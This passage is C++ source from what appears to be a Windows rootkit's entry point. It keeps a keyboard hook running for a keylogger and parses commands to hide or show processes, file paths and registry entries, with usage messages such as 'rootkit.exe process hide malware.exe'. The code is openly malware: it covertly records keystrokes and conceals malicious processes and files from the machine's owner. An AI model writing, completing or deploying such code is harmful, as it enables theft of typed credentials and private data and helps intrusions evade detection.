        // Message loop to keep keyboard hook active
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        // Cleanup on exit
        Keylogger::Stop();
        return 0;
    }

    // Cas 2: Commande "help"
    if (argc >= 2 && wcscmp(argv[1], L"help") == 0)
    {
        showHelp();
        LocalFree(argv);
        Sleep(3000);
        return 0;
    }

    // Case 3: Commands with 3 or more arguments (type action [value])
    if (argc >= 3)
    {
        wstring type = argv[1];   // process / path / registry
        wstring action = argv[2]; // hide / show
        wstring value;

        // Hide commands require a value
        if (action == L"hide")
        {
            if (argc < 4)
            {
                wcout << L"[!] Error: 'hide' command requires a value" << endl;
                wcout << L"[i] Example: rootkit.exe process hide malware.exe" << endl;
                LocalFree(argv);
                Sleep(2000);
                return 1;
            }
            value = argv[3];
        }

        // Process the command
        processCommand(type, action, value);

        LocalFree(argv);
        wcout << L"\n[+] Command executed successfully" << endl;
        Sleep(2000);
        return 0;
    }

    // Case 4: Invalid arguments
    wcout << L"[!] Invalid command" << endl;
    wcout << L"[i] Use 'rootkit.exe help' to see the commands" << endl;
    LocalFree(argv);
    Sleep(2000);
    return 1;
}
